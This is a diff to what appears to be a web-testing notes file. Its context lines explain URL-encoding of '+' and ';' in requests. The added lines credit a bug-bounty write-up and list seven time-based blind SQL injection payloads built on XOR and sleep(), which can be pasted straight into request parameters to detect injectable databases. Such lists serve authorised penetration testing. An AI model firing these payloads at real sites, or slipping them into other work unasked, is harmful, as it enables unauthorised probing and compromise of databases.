@@ -38,3 +38,14 @@ in your string, you must encode it using %2b. In the previous numeric
 example, therefore, 1+1 should be submitted as 1%2b1.
  The semicolon is used to separate cookie fi elds and should be encoded 
 using %3b.
+-------------------------------------------------------------------------
+ payloads from : https://ahmadaabdulla.medium.com/how-i-found-sql-injection-on-8x8-cengage-comodo-automattic-20-company-c296d1a09f63
+-------------------------------------------------------------------------
+
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
